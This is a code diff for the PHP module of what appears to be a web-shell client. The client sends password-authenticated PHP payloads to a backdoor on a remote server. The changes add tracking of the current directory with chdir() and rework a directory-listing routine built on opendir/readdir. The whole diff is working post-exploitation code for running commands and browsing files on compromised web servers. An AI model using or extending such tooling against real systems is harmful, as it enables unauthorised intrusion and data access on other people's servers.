@@ -18,16 +18,21 @@ class Php(Module):
     def __init__(self, modhandler, url, password):
         
         self.cwd_vector = None
+        self.path = None
         self.proxy = None
         
         Module.__init__(self, modhandler, url, password)
         
         proxy = self.modhandler.conf.get_option('global', 'http_proxy')
         if proxy:
-            print '[+] Setting http proxy \'%s\'' % (proxy)
+            print '[shell.php] Setting http proxy \'%s\'' % (proxy)
             self.proxy = { 'http' : proxy }
             
-            
+        if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
+            print '[!] Error setting current directory parameters, this function will no work.'
+        else:
+            self.cwd_vector = "chdir('%s') && %s" 
+        
 
     def _probe(self):
         
@@ -37,10 +42,10 @@ class Php(Module):
             raise ModuleException("shell.sh",  "PHP interpreter initialization failed")
         
     
-    def run(self, cmd):
+    def run(self, cmd, use_current_path = True):
 
-        if self.cwd_vector:
-            cmd = self.cwd_vector % (cmd)
+        if use_current_path and self.path:
+            cmd = self.cwd_vector % (self.path, cmd)
         
         request = CmdRequest( self.url, self.password, self.proxy)
         request.setPayload(cmd)
@@ -55,28 +60,25 @@ class Php(Module):
             return resp
         
 
-    def cwd_handler (self, path, set_new_cwd=False):
+    def cwd_handler (self, path):
         
-        response = self.run("file_exists('%s') && print(1);" % path)
+        response = self.run("is_dir('%s') && print(1);" % path, False)
         if response == '1':
-            if set_new_cwd:
-                self.cwd_vector = "chdir('%s') && %s" % ( path, '%s' )  
-                
+            self.path = path
             return True
-        
         return False
     
     def ls_handler (self, cmd):
         
         cmd_splitted = cmd.split()
-        if cmd_splitted[0] == 'ls':
-            if len(cmd_splitted)==1:
-                path = '.'
-            if len(cmd_splitted)==2:
-                path = cmd_splitted[1]
         
         ls_vector = "$dir=@opendir('%s'); $a=array(); while(($f = readdir($dir))) { $a[]=$f; }; sort($a); print(join('\n', $a));"
         
-        return self.run( ls_vector % (path))
+        if len(cmd_splitted)==2:
+            path = cmd_splitted[1]
+        else:
+            path = self.path
+            
+        return self.run( ls_vector % (path), False)
     
     
